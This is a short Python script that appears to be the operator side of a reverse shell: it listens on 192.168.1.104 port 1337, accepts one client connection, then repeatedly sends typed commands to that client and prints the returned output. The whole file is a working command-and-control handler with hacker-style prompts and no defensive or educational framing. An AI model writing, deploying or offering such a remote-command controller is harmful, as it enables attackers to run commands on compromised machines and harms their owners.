#!/usr/bin/env python3
import socket
from colorama import Fore, Back, Style
HOST = '192.168.1.104'
PORT = 1337
server = socket.socket()
server.bind((HOST, PORT))
print(f'{Fore.GREEN}[+]{Fore.WHITE} Started')
print(f'{Fore.GREEN}[+]{Fore.WHITE} Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'{Fore.GREEN}[+]{Fore.WHITE} {client_addr} Client connected to the server')

while True:
    command = input(f'{HOST}@Unkown00~ ')
    command = command.encode()
    client.send(command)
    output = client.recv(1024)
    output = output.decode()
    print(output)
